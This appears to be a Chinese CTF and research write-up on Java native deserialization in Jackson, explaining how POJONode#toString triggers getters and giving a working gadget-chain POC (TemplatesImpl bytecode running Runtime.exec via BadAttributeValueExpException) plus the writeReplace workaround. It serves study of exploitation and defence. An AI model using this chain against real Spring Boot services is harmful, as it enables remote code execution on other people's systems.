## 前言

前面说到了在fastjson中的原生的一个反序列化调用任意类的getter方法的原理与细节

从最开始的fastjson < 1.2.48下的在`JSONObject /
JSONArray`类反序列化过程没有安全检查的情况下通过`BadAttributeValueExpException#readObject`调用`JSONObject#toString
/ JSONArray#toString`方法也即是`JSON#toString`方法触发getter

再到fastjson >=
1.2.48下的存在有`SecureObjectInputStream`的安全检查的情况下，通过使用`HashMap`等等类创建一个`reference`的方式绕过resolveClass的检查触发getter

既然在fastjson中存在有这样的原生反序列化，在另一个和他功能类似的开源库jackson也有着类似的原生反序列化触发getter方法

这也是在 <https://xz.aliyun.com/t/12485#toc-5> 这一题中用到的知识点

## Jackson的知识点

简单的认识一下Jackson的序列化触发getter的流程

在jackson中将对象序列化成一个json串主要是使用的`ObjectMapper#writeValueAsString`方法

![](./img/6947817088971772080.png)

![](./img/5689889026588056847.png)

在使用这个方法的过程中将会调用getter方法

大致的调用栈如下

    
    
    serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
    serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
    serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
    _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
    serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
    _writeValueAndClose:4568, ObjectMapper (com.fasterxml.jackson.databind)
    writeValueAsString:3821, ObjectMapper (com.fasterxml.jackson.databind)
    

提及几个关键的方法

`DefaultSerializerProvider#serializeValue`:

![](./img/3026014936690901675.png)

  1. 通过`findTypedValueSerializer`来从缓存中获取对应的序列化器，如果没有将会创建一个序列化器并写入缓存中，这里传入的是一个POJO对象，所以得到的是一个`BeanSerializer`类

来到`BeanSerializer#serialize`进行json串的构造

![](./img/6998698958444187808.png)

首先是调用`writeStartObject`方法写入`{`字符，之后中间是对Bean对象的属性值的一些构造，最后是调用`writeEndObject`方法写入`}`字符

而在`BeanSerializerBase#serializeFields`方法中

![](./img/6917686703606305821.png)

主要是对Bean类中的所有属性值的写入

![](./img/8316002102847951202.png)

而最后是能够调用对应属性值的getter方法进行赋值

## 例题

这里同样是通过一道CTF的题目来引入jackson中的原生反序列化

题目附件：<https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1>

这里只有一个controller:

![](./img/4413286850474339185.png)

就直接是获取了请求体的序列化数据进行反序列化，没有任何的过滤

而在`pom.xml`中查看依赖，除了存在有`spring-boot-starter-web:2.6.11`之外没有任何依赖

![](./img/7050392593094522270.png)

而这里的关键点jackson相较于fastjson的优势就是与springboot紧密结合，所以jackson这个依赖是存在这个`spring-boot-starter-web`依赖中的

![](./img/6145083622407518049.png)

根据前面的知识点，我们需要构造`BadAttributeValueExpException#readObject -> POJONode#toString
-> getter`的链子

至于为什么要选择使用`POJONode`类来进行getter方法的触发在后面将会详细的描述

POC：

    
    
    ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.makeClass("a");
            CtClass superClass = pool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superClass);
            CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
            constructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
            clazz.addConstructor(constructor);
            byte[][] bytes = new byte[][]{clazz.toBytecode()};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setValue(templates, "_bytecodes", bytes);
            setValue(templates, "_name", "xx");
    //        setValue(templates, "_tfactory", null);
            setValue(templates, "_tfactory", new TransformerFactoryImpl());
    
            POJONode node = new POJONode(templates);
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(val, node);
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
            oos.writeObject(val);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            Object o = (Object)ois.readObject();
    

这里优点小坑，如果直接执行上面的POC，在序列化过程中将会出现错误：

![](./img/1587256270863364083.png)

根据报错定位到`ObjectOuptputStream#writeObject0`中

![](./img/6325376272350213147.png)

如果序列化的类实现了`writeReplace`方法，将会在序列化过程中调用它进行检查，好巧不巧，在`POJONode`的父类`BaseJsonNode`中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断

我们可以通过删除这个方法来跳过这个过程，进而成功的序列化

![](./img/6081610765843043738.png)

之后POC就能打通，后面的过程就很简单了

## getter方法的调用

在前面的过程中，留下了一个问题，也就是为什么POJONode类的toString方法能够调用对应类对象的getter方法呢？

![](./img/1633827050501302314.png)

POJONode中不存在有toString方法的实现，在其父类`BaseJsonNode`中存在有，因其为一个抽象类，所以选择使用POJONode这个没有实现toString方法的类进行利用

![](./img/2233450007274040177.png)

![](./img/5804269720982032935.png)

依次调用了`toString -> InternalNodeMapper#nodeToString ->
ObjectWriter.writeValueAsString`方法

最关键的就是最后一个方法的调用了，在最前的`Jackson`的知识点中，提到了在将一个Bean对象序列化一个json串的使用常用的方法是`writeValueAsString`方法，并详细分析了，在调用该方法的过程中将会通过遍历的方法将bean对象中的所有的属性的getter方法进行调用

这里也是getter方法调用的成因

## Other Gadgets

  1. 除了使用POJONode类的方式还存在其他的利用链吗？
  2. 如果`BadAttributeValueExpException`等可以触发`toString`方法的类被Ban了，还有会利用的可能型吗？

谈谈第一个问题：

按照理论来说只需要寻找到继承`BaseJsonNode`的类，并且没有重写toSting方法，就能够替代`POJONode`类

但是看了下他的实现类

![](./img/4094597852987056060.png)

几乎是与数据类型相关的，除了POJONode类我没有发现可以存放Object并序列化的类

有或者是找到在jackson中存在有`writeValueAsString`方法的调用的类

## 参考

<https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1>

<https://xz.aliyun.com/t/12485>

